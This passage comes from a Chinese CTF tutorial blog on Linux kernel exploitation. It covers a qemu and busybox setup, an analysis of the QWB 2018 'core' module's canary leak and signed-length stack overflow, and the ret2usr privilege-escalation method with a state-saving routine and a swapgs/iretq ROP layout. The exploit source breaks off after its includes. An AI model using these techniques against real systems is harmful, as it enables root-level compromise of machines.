&amp;&amp; op != <span class="number">1</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">1</span>) offset += filp-&gt;f_pos;</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt; MAX_SIZE) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> filp-&gt;f_pos = offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>makefile</strong></p>
<div class="code-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">obj-m := ko_test.o</span><br><span class="line"></span><br><span class="line">KERNELDR :=/home/kl/linux-5.4.98</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></div>

<p>make 之后，将 <code>ko_test.ko</code> 文件打包进 busybox 文件系统中，并创建文件夹 <code>mkdir -p  proc sys dev etc/init.d</code>。然后创建启动脚本并赋予其可执行权限。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">insmod /lib/ko_test.ko</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure></div>

<p>之后在busybox 根目录运行命令 <code>find . | cpio -o -H newc &gt; ../rootfs.img </code>。将编译好的<code>/kernel/arch/x86/boot/bzImage</code>复制到rootfs.img 同级目录。</p>
<p>启动 qemu。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240201192628878.png"
                      alt="image-20240201192628878"
                ></p>
<h1 id="内核栈利用"><a href="#内核栈利用" class="headerlink" title="内核栈利用"></a>内核栈利用</h1><h2 id="QWB-2018-core"><a href="#QWB-2018-core" class="headerlink" title="QWB_2018_core"></a>QWB_2018_core</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><strong>start.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 128M \</span><br><span class="line">	-kernel ./bzImage \</span><br><span class="line">	-initrd  ./core.cpio \</span><br><span class="line">	-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">	-s \</span><br><span class="line">	-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">	-nographic  \</span><br></pre></td></tr></table></figure></div>

<p>开启了<code> kaslr</code>保护。</p>
<blockquote>
<p>如果自己编译的 qemu 可能会报错<code>network backend ‘user‘ is not compiled into this binary</code>，解决方法就是<code>sudo apt-get install libslirp-dev</code>，然后重新编译 <code>./configure --enable-slirp</code>。</p>
</blockquote>
<p><strong>init</strong></p>
<p>解压 core.cpio ，分析 init 文件：</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ mount -t proc proc /proc</span><br><span class="line">   3   │ mount -t sysfs sysfs /sys</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ /sbin/mdev -s</span><br><span class="line">   6   │ <span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">   8   │ <span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line">   9   │ <span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">  10   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  11   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  12   │ ifconfig eth0 up</span><br><span class="line">  13   │ udhcpc -i eth0</span><br><span class="line">  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">  15   │ route add default gw 10.0.2.2 </span><br><span class="line">  16   │ insmod /core.ko</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ poweroff -d 120 -f &amp;</span><br><span class="line">  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  20   │ <span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ umount /sys</span><br><span class="line">  23   │ </span><br><span class="line">  24   │ poweroff -d 0 -f</span><br><span class="line">───────┴────────────────────────────</span><br></pre></td></tr></table></figure></div>

<ul>
<li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了</li>
<li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了</li>
<li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了</li>
<li>第 18 行设置了定时关机，为了避免做题时产生干扰，直接把这句删掉然后重新打包</li>
</ul>
<p>里面还有一个 gen_cpio.sh 脚本，用于快速打包。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: gen_cpio.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ find . -print0 \</span><br><span class="line">   2   │ | cpio --null -ov --format=newc \</span><br><span class="line">   3   │ | gzip -9 &gt; <span class="variable">$1</span></span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure></div>

<p><strong>core.ko</strong></p>
<p>检查一下保护。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec core/core.ko</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/kernel/pwn/give_to_player/core/core.ko&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure></div>

<p>使用 IDA 继续分析.ko文件。</p>
<p><code>init_module()</code> 注册了 <code>/proc/core</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>exit_core()</code>删除 <code>/proc/core</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>core_ioctl()</code> 定义了三条命令，分别调用 <code>core_read(), core_copy_func()</code>和设置全局变量 <code>off</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>core_read()</code> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code> 来 <code>leak canary</code> 和一些地址 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;\x016%d %p\n&quot;</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(v1, &amp;v4[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>core_copy_func()</code> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 <code>qmemcpy</code> 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="comment">// 这里用的jg判断，为有符号判断，0xffffffffffff0000|(0x100) 会判定为负从而绕过。</span></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>core_write()</code> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 <code>ropchain</code> 了 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>关闭 <code>kaslr</code> 并将权限调到 <code>root</code>，通过 <code>add-symbol-file core.ko textaddr</code> 把 <code>core.ko</code> 符号加载进去。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gdb -q \</span><br><span class="line">  -ex <span class="string">&quot;file <span class="subst">$(find . -name vmlinux)</span>&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;add-symbol-file <span class="subst">$(find . -name core.ko)</span> 0xffffffffc0000000&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;target remote localhost:1234&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;b *0xffffffffc000015f&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;c&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>exp 都很简单，很容易看懂，就不调试了。</p>
<h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><p>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由<code>system(&quot;/bin/sh&quot;)</code> 变为了 <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p>
<p><strong>状态保存</strong></p>
<p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要着陆回用户态以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要手动模拟用户态进入内核态的准备工作<strong>——</strong>保存各寄存器的值到内核栈上，以便于后续着陆回用户态。通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p>
<blockquote>
<p>算是一个通用的 pwn 板子。</p>
<p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code>。</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>返回用户态</strong></p>
<p>由内核态返回用户态只需要：</p>
<ul>
<li><code>swapgs</code>指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序。也用于恢复用户态 GS 寄存器。</li>
<li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li>
</ul>
<p>那么我们只需要在内核中找到相应的 gadget 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p>
<p>执行 <code>iretq</code> 时的栈布局。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|</span><br><span class="line">| RIP                  |&lt;== low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| CS                   |</span><br><span class="line">|----------------------|</span><br><span class="line">| EFLAGS               |</span><br><span class="line">|----------------------|</span><br><span class="line">| RSP                  |</span><br><span class="line">|----------------------|</span><br><span class="line">| SS                   |&lt;== high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure></div>

<p>所以我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags <span class="comment">//64bit user_rflags</span></span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>在未开启 <code>SMAP/SMEP</code> 保护的情况下，用户空间无法访问内核空间的数据，但是内核空间可以访问 &#x2F; 执行用户空间的数据，因此 <code>ret2usr</code> 这种攻击手法应运而生，以内核的 ring 0 权限执行用户空间的代码以完成提权。<code>ret2user</code> 即返回到用户空间的提权代码上进行提权，之后返回用户态即为 root 权限。通常 CTF 中的 ret2usr 还是以执行<code>commit_creds(prepare_kernel_cred(NULL))</code>进行提权为主要的攻击手法，不过相比起构造冗长的 ROP chain，ret2usr 只需我们要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接 ret 回到用户空间执行即可。另外题目给的vmlinux用于提取gadget可以，但使用IDA分析时太慢，可以用vmlinux-to-elf解压bzImage进行分析。</p>
<ol>
<li>从 <code>/tmp/kallsyms</code> 读取符号地址，确认与<code>nokaslr</code>偏移，从<code>vmlinux</code>寻找<code>gadget</code>。</li>
<li>保存用户状态。</li>
<li>通过设置 off 读取 canary。</li>
<li>于内核态访问用户空间的 <code>commit_creds(prepare_kernel_cred(NULL))</code>提权。</li>
<li>通过 <code>swapgs; mov trap_frame, rsp; iretq</code> 返回用户空间，并执行 <code>system(&quot;/bin/sh&quot;);</code>。</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 